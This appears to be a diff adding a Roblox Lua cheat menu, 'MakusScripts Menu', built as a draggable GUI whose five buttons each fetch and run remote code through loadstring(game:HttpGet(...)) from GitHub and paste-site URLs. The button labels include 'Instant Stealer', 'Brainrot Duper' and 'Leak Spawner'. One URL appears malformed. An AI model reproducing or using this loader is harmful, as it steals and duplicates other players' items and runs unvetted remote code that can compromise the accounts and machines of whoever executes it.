@@ -1,0 +1,166 @@
+--// MakusScripts Menu (Black Theme) + Close + Draggable Circle Logo Button
+
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+
+if CoreGui:FindFirstChild("RedMenu") then CoreGui.RedMenu:Destroy() end
+
+-- ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "RedMenu"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+ScreenGui.Parent = CoreGui
+
+-- Main Frame (Black Theme)
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 250, 0, 200)
+Frame.Position = UDim2.new(0.5, -125, 0.5, -100)
+Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)  -- BLACK
+Frame.BorderSizePixel = 0
+Frame.BackgroundTransparency = 0.05
+Frame.Active = true
+Frame.Draggable = true
+Frame.Visible = false
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0, 15)
+
+local UIStroke = Instance.new("UIStroke", Frame)
+UIStroke.Thickness = 3
+UIStroke.Color = Color3.fromRGB(70, 0, 0)  -- dark red edge
+UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- Title Bar (Black)
+local TitleBar = Instance.new("Frame")
+TitleBar.Size = UDim2.new(1, -12, 0, 40)
+TitleBar.Position = UDim2.new(0, 6, 0, 6)
+TitleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+TitleBar.BackgroundTransparency = 0.15
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = Frame
+
+local TBcorner = Instance.new("UICorner", TitleBar)
+TBcorner.CornerRadius = UDim.new(0, 12)
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -40, 1, 0)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "MakusScripts Menu"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.TextColor3 = Color3.fromRGB(255, 255, 255) -- white
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = TitleBar
+
+-- Close Button (Black)
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -38, 0, 5)
+CloseButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 90, 90)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 18
+CloseButton.Parent = Frame
+
+local CloseCorner = Instance.new("UICorner", CloseButton)
+CloseCorner.CornerRadius = UDim.new(0, 8)
+
+-- Scrollable Button Container
+local ButtonContainer = Instance.new("ScrollingFrame")
+ButtonContainer.Size = UDim2.new(1, -20, 1, -70)
+ButtonContainer.Position = UDim2.new(0, 10, 0, 50)
+ButtonContainer.BackgroundTransparency = 1
+ButtonContainer.ScrollBarThickness = 4
+ButtonContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+ButtonContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
+ButtonContainer.Parent = Frame
+
+local UIListLayout = Instance.new("UIListLayout", ButtonContainer)
+UIListLayout.Padding = UDim.new(0, 10)
+UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+-- Function to create white-text buttons
+local function createButton(name, text, callback)
+    local wrapper = Instance.new("Frame")
+    wrapper.Size = UDim2.new(0.9, 0, 0, 40)
+    wrapper.BackgroundTransparency = 1
+    wrapper.Parent = ButtonContainer
+
+    local button = Instance.new("TextButton")
+    button.Name = name
+    button.Size = UDim2.new(1, 0, 1, 0)
+    button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)  -- black button
+    button.Text = text
+    button.Font = Enum.Font.GothamBold
+    button.TextSize = 18
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextStrokeTransparency = 1
+    button.TextWrapped = true
+    button.Parent = wrapper
+
+    local corner = Instance.new("UICorner", button)
+    corner.CornerRadius = UDim.new(0, 10)
+
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.1), {
+            BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        }):Play()
+    end)
+
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.1), {
+            BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+        }):Play()
+    end)
+
+    button.MouseButton1Click:Connect(callback)
+end
+
+-- Menu Buttons
+createButton("Button1", "Instant Stealer", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/Yohohoho/refs/heads/main/Heheheha"))()
+end)
+
+createButton("Button2", "Admin Command", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/Ok"))()
+end)
+
+createButton("Button3", "Brainrot Duper", function()
+    loadstring(game:HttpGet("https://pastefy.app/fI0CcmL4/raw"))()
+end)
+
+createButton("Button4", "For Duping\n(1 Player On Server only)", function()
+    loadstring(game:HttpGet("https://pasteapp/Hmd4FmZX/raw"))()
+end)
+
+-- Leak Spawner
+createButton("Button5", "Leak Spawner", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/AddBrenrot/refs/heads/main/addbrenrot.txt"))()
+end)
+
+-- Close behavior
+CloseButton.MouseButton1Click:Connect(function()
+    Frame.Visible = false
+end)
+
+-- Circle Logo Button (Your Logo)
+local OpenButton = Instance.new("ImageButton")
+OpenButton.Size = UDim2.new(0, 55, 0, 55)
+OpenButton.Position = UDim2.new(0, 30, 0.5, -27)
+OpenButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+OpenButton.Image = "rbxassetid://117995088410104" -- YOUR LOGO
+OpenButton.Parent = ScreenGui
+OpenButton.Active = true
+OpenButton.Draggable = true
+
+local OpenCorner = Instance.new("UICorner", OpenButton)
+OpenCorner.CornerRadius = UDim.new(1, 0)
+
+OpenButton.MouseButton1Click:Connect(function()
+    Frame.Visible = not Frame.Visible
+end)
